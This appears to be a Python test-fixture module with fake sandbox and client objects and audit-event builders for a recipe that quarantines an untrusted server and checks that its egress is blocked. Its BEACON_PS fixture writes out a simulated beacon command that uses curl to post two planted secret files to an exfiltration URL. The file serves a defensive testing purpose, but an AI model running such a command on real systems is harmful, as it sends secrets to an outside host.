"""In-memory stand-ins for the SDK sandbox and client, with neutral names and no real wire fields."""
import json
from types import SimpleNamespace

from neevai import AuditEvent

import quarantine

KEY_ID = "1234abcd-5678-4def-9abc-def012345678"
SANDBOX_ID = "01a10ca6-f39d-793d-b659-7aa536f71813"

# A process listing in which the untrusted server's beacon is visible, reading both planted secrets.
BEACON_PS = (
    "    1 /sbin/init\n"
    f"  742 sh -c : {quarantine.BEACON_MARKER}; curl --data-binary @{quarantine.SECRET_FILES[0]} "
    f"--data-binary @{quarantine.SECRET_FILES[1]} {quarantine.EXFIL_URL}\n"
    "  900 python3 harness.py\n"
)
CLEAN_PS = "    1 /sbin/init\n  900 python3 harness.py\n"

HARNESS_OK = json.dumps({"ok": True, "tools": ["summarize_text"],
                         "answer": {"summary": "13 words. Gist: NeevCloud sandboxes run untrusted code..."}})

OBSERVED_OK = {
    "read": [{"path": quarantine.SECRET_FILES[0], "bytes": 227},
             {"path": quarantine.SECRET_FILES[1], "bytes": 142}],
    "exfil": {"url": quarantine.EXFIL_URL, "blocked": True, "error": "URLError: <urlopen error timed out>"},
    "beacon_pid": 742, "beacon_marker": quarantine.BEACON_MARKER,
}


def _event(outcome, **fields):
    failed = outcome != "success"
    return AuditEvent.model_validate({
        "time": 1_791_200_000_000, "severity_id": 1, "severity": "Informational",
        "status_id": 2 if failed else 1, "status": "Failure" if failed else "Success",
        "actor": {"user": {"type": "API Key", "type_id": 99, "uid": KEY_ID,
                           "programmatic_credentials": [{"uid": KEY_ID, "type": "API Key"}]}},
        "device": {"type_id": 6, "type": "Virtual", "uid": SANDBOX_ID},
        "cloud": {"provider": "NeevCloud", "account": {"uid": "prj-fake"}, "org": {"uid": "org-fake"}}, "osint": [],
        "metadata": {"version": "1.9.0", "product": {"name": "Sandbox Audit", "vendor_name": "NeevCloud"}, "uid": "e1"},
        **fields})


def audit_record(tool="exec", command="python3", target="harness.py", outcome="success"):
    """Builds one audit event in the API's shape: a path is a file resource for fs calls, a program a process."""
    resources = [{"type": "sandbox", "uid": SANDBOX_ID}]
    if target is not None:
        resources.append({"type": "file" if tool.startswith("fs.") else "process", "name": target})
    if command is not None:
        resources.append({"type": "process", "name": command})
    return _event(outcome, class_uid=6003, class_name="API Activity", category_uid=6,
                  category_name="Application Activity", activity_id=1, activity_name="Create", type_uid=600301,
                  type_name="API Activity: Create", api={"operation": tool}, resources=resources)


def network_event(dst=None, program="python3", outcome="failure"):
    """Builds a Network Activity event, which execution trace adds for a connection a program opened; no api."""
    return _event(outcome, class_uid=4001, class_name="Network Activity", category_uid=4,
                  category_name="Network Activity", activity_id=1, activity_name="Open", type_uid=400101,
                  type_name="Network Activity: Open", dst_endpoint=dst or {"ip": "93.184.215.14", "port": 443},
                  process={"pid": 742, "name": program})


def process_event(program="sh"):
    """Builds a Process Activity launch, which execution trace adds for a program the sandbox started; no api."""
    return _event("success", class_uid=1007, class_name="Process Activity", category_uid=1,
                  category_name="System Activity", activity_id=1, activity_name="Launch", type_uid=100701,
                  type_name="Process Activity: Launch", process={"pid": 742, "name": program})


def _result(exit_code=0, stdout="", stderr=""):
    return SimpleNamespace(exit_code=exit_code, stdout=stdout, stderr=stderr)


class FakeSandbox:
    """Scripts the sandbox calls the recipe makes: exec by command shape, files, egress update, audit."""

    def __init__(self, *, pip_exit=0, harness_stdout=HARNESS_OK, probe=_result(28, "0 000"),
                 pypi_probe=_result(28, "0 000"), ps_stdout=BEACON_PS, observed=OBSERVED_OK,
                 audit_records=None, ready_error=None, raise_on=None):
        self.name = f"{quarantine.PREFIX}test"
        self.pip_exit = pip_exit
        self.harness_stdout = harness_stdout
        self.probe = probe
        self.pypi_probe = pypi_probe
        self.ps_stdout = ps_stdout
        self.observed = observed
        self.audit_records = audit_records if audit_records is not None else [audit_record()]
        self.ready_error = ready_error
        self.raise_on = raise_on or {}
        self.calls = []          # ordered ("exec"|"update"|"write", detail) for sequence assertions
        self.written = {}
        self.deleted = False
        self.files = SimpleNamespace(write=self._write, read=self._read)

    def wait_until_ready(self, timeout_ms=None):
        if self.ready_error:
            raise self.ready_error
        return self

    def exec(self, command, args=None, cwd=None, env=None, timeout_ms=None, stdin=None):
        joined = " ".join([command] if isinstance(command, str) else list(command))
        joined = " ".join([joined, *(args or [])])
        self.calls.append(("exec", joined))
        for needle, error in self.raise_on.items():
            if needle in joined:
                raise error
        if "-m pip install" in joined:
            return _result(self.pip_exit, "", "" if self.pip_exit == 0 else "pip: could not install")
        if "harness.py" in joined:
            return _result(0, self.harness_stdout)
        if quarantine.PROBE_PAYLOAD in joined:  # an egress probe; pick the result by which host it targets
            return self.probe if quarantine.EXFIL_HOST in joined else self.pypi_probe
        if "-eo" in joined:
            return _result(0, self.ps_stdout)
        return _result(0, "")

    def update(self, params):
        self.calls.append(("update", params))
        return self

    def audit(self, from_=None, limit=None, **kwargs):
        return SimpleNamespace(data=list(self.audit_records), next_cursor=None)

    def delete(self):
        self.deleted = True

    def _write(self, path, content, cwd=None):
        self.calls.append(("write", path))
        self.written[path] = content
        return {"bytes_written": len(content)}

    def _read(self, path, cwd=None):
        if path == quarantine.OBSERVED and self.observed is not None:
            return json.dumps(self.observed).encode()  # the SDK returns bytes
        raise FileNotFoundError(path)


class FakeClient:
    """Mimics NeevAI().sandboxes.create and records the create params and allow_egress."""

    def __init__(self, sandbox):
        self.created = []

        def create(params, allow_egress=None):
            self.created.append((params, allow_egress))
            return sandbox

        self.sandboxes = SimpleNamespace(create=create)
